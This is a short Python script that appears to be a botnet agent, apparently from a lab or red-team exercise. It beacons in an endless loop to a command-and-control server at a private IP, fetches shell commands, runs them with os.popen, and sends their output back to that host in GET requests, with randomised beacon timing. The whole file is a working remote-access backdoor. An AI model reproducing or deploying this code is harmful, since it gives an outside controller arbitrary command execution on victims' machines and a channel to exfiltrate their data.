#!/usr/bin/python3
import os, requests, time, socket, json, random, sys


"""
Function: getIP
Parameters: None
Returns: IP of bot
Description: Uses a socket to determine IP of Bot
"""
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
	

"""
Function: beacon
Parameters: None
Returns: None
Description: Loops infinately and beacons to c2 server. Recieves commands
			 and sends back command output
"""
def beacon():
	#loop
	while True:
		cmds = {}
		ip = getIP()
		#random offset to vary beacon timing
		offset = random.randrange(-7,7)

		#commands from server to run
		commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(ip))

		#catch error for bot not being in botlist on server
		if commands.status_code == 500:
			continue
		commands = json.loads(str(commands.content, 'utf-8'))
		#check empty command set
		if commands != '[]':
			for cmd in commands:
				#executes comand
				cmds[cmd] = os.popen(cmd).read()
				#send confirmation of command being run
				requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(ip, cmd, cmds[cmd])) 
			#print commands
			#print(cmds)
			#TODO send command respone to server
		#wait 3 to 17 seconds to callback
		time.sleep(10 + offset)


beacon()